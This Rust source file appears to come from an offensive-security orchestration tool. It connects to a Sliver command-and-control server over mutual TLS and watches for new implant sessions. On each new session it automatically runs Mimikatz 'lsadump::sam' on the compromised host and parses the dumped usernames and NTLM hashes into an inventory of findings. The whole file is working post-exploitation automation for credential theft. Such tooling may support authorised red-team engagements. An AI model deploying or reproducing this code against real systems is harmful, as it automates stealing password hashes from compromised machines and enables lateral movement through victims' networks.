use crate::core::orchestrator::c2::sliver_proto::sliver::rpcpb::sliver_rpc_client::SliverRpcClient;
use crate::core::orchestrator::c2::sliver_proto::sliver::commonpb::{Empty, Request as CommonRequest};
use crate::core::orchestrator::c2::sliver_proto::sliver::sliverpb::{CallExtensionReq, CallExtension};
use crate::models::{Finding, Category, Severity};
use crate::core::orchestrator::swarm::inventory::SwarmInventory;
use std::sync::Arc;
use tracing::{info, error};
use tokio_stream::StreamExt;
use tonic::transport::{Certificate, Identity, ClientTlsConfig, Channel};
use once_cell::sync::Lazy;
use regex::Regex;
use std::time::Duration;
use async_trait::async_trait;

static RE_NTLM: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)Hash NTLM\s*:\s*([a-f0-9]{32})").unwrap());
static RE_USER: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)User\s*:\s*([^\r\n]+)").unwrap());

// ---------------------------------------------------------------------------
// C2Client Trait — seam for testing
// ---------------------------------------------------------------------------

/// Abstraction over the Sliver gRPC client.
/// Allows injection of mock implementations in contract tests.
#[async_trait]
pub trait C2Client: Send + Sync + Clone + 'static {
    /// Execute a named extension on a remote implant.
    async fn call_extension(&mut self, req: CallExtensionReq) -> anyhow::Result<CallExtension>;
}

/// Blanket impl for the real tonic-generated client.
#[async_trait]
impl C2Client for SliverRpcClient<Channel> {
    async fn call_extension(&mut self, req: CallExtensionReq) -> anyhow::Result<CallExtension> {
        let response = SliverRpcClient::call_extension(self, tonic::Request::new(req))
            .await
            .map_err(|e| anyhow::anyhow!("gRPC call_extension failed: {}", e))?;
        Ok(response.into_inner())
    }
}

// ---------------------------------------------------------------------------
// SliverFeedbackLoop
// ---------------------------------------------------------------------------

pub struct SliverFeedbackLoop {
    server_addr: String,
    inventory: Arc<SwarmInventory>,
    ca_cert: Option<Vec<u8>>,
    client_identity: Option<(Vec<u8>, Vec<u8>)>, // (cert, key)
}

impl SliverFeedbackLoop {
    pub fn new(
        server_addr: String,
        inventory: Arc<SwarmInventory>,
        ca_cert: Option<Vec<u8>>,
        client_cert: Option<Vec<u8>>,
        client_key: Option<Vec<u8>>,
    ) -> Self {
        let client_identity = if let (Some(c), Some(k)) = (client_cert, client_key) {
            Some((c, k))
        } else {
            None
        };
        Self { server_addr, inventory, ca_cert, client_identity }
    }

    /// Start the background feedback loop.
    ///
    /// NOTE: Intentionally diverging — this function never returns `Ok(())`.
    /// Return type is `anyhow::Result<()>` for compatibility with `tokio::spawn`.
    pub async fn run(self) -> anyhow::Result<()> {
        let mut backoff = Duration::from_secs(1);
        let max_backoff = Duration::from_secs(60);

        loop {
            info!("SliverFeedbackLoop: connecting to {}", self.server_addr);
            match self.try_run().await {
                Ok(_) => {
                    info!("SliverFeedbackLoop: stream ended normally. Reconnecting...");
                    backoff = Duration::from_secs(1);
                }
                Err(e) => {
                    error!("SliverFeedbackLoop: error: {}. Retrying in {:?}...", e, backoff);
                    tokio::time::sleep(backoff).await;
                    backoff = std::cmp::min(backoff * 2, max_backoff);
                }
            }
        }
    }

    async fn try_run(&self) -> anyhow::Result<()> {
        let mut endpoint = Channel::from_shared(self.server_addr.clone())?;

        if let Some(ca) = &self.ca_cert {
            let mut tls_config = ClientTlsConfig::new()
                .ca_certificate(Certificate::from_pem(ca));
            if let Some((cert, key)) = &self.client_identity {
                tls_config = tls_config.identity(Identity::from_pem(cert, key));
            }
            endpoint = endpoint.tls_config(tls_config)?;
        }

        let channel = endpoint.connect().await?;
        let mut client = SliverRpcClient::new(channel);

        info!("SliverFeedbackLoop: connected via mTLS. Subscribing to events...");

        let mut stream = client.events(tonic::Request::new(Empty::default())).await?.into_inner();

        while let Some(event_res) = stream.next().await {
            match event_res {
                Ok(event) => {
                    if let Some(session) = event.session {
                        info!("🎯 SliverFeedbackLoop: New Session — ID: {} Host: {}", session.id, session.hostname);
                        let inventory_clone = self.inventory.clone();
                        let client_clone = client.clone();
                        let session_id = session.id.clone();
                        tokio::spawn(async move {
                            if let Err(e) = Self::handle_new_session(client_clone, session_id, inventory_clone).await {
                                error!("SliverFeedbackLoop: session handler error: {}", e);
                            }
                        });
                    }
                }
                Err(e) => {
                    return Err(anyhow::anyhow!("Event stream error: {}", e));
                }
            }
        }
        Ok(())
    }

    /// Core post-exploitation handler. Accepts any C2Client implementation,
    /// enabling contract testing without a live Sliver server.
    pub async fn handle_new_session<C: C2Client>(
        mut client: C,
        session_id: String,
        inventory: Arc<SwarmInventory>,
    ) -> anyhow::Result<()> {
        info!("SliverFeedbackLoop: running lsadump on session {}", session_id);

        // Build request — session_id MUST be present for the server to route correctly.
        let req = CallExtensionReq {
            name: "mimikatz".to_string(),
            args: b"lsadump::sam".to_vec(),
            request: Some(CommonRequest {
                session_id: session_id.clone(),
                ..Default::default()
            }),
            ..Default::default()
        };

        let response = client.call_extension(req).await?;
        let output = String::from_utf8_lossy(&response.output);

        info!("SliverFeedbackLoop: Mimikatz done for {}. Parsing...", session_id);

        for (user, hash) in Self::parse_mimikatz_output(&output) {
            info!("🔱 Credential extracted — user: {} hash: {}", user, hash);
            let mut f = Finding::new(
                crate::models::constants::FINDING_NTLM_HASH_CAPTURED,
                Category::CredentialLeak,
                Severity::High,
                &format!("NTLM hash for '{}' recovered via Mimikatz on session {}.", user, session_id),
                serde_json::json!({
                    "username": user,
                    "ntlm":     hash,
                    "source":   format!("sliver:{}", session_id),
                }),
            );
            f.core.scope_id = "Auto-Inferred".to_string();
            inventory.ingest_finding(f, crate::core::orchestrator::swarm::inventory::TrustLevel::Private);
        }

        Ok(())
    }

    /// Pure parser — extracted for unit testability. Stateless, no I/O.
    pub fn parse_mimikatz_output(output: &str) -> Vec<(String, String)> {
        let mut results = Vec::new();
        let mut current_user: Option<String> = None;

        for line in output.lines() {
            if let Some(caps) = RE_USER.captures(line) {
                current_user = Some(
                    caps.get(1).map(|m| m.as_str().trim().to_string()).unwrap_or_default(),
                );
            } else if let Some(caps) = RE_NTLM.captures(line) {
                if let Some(user) = current_user.take() {
                    let hash = caps.get(1).map(|m| m.as_str().trim().to_string()).unwrap_or_default();
                    results.push((user, hash));
                }
            }
        }

        results
    }
}
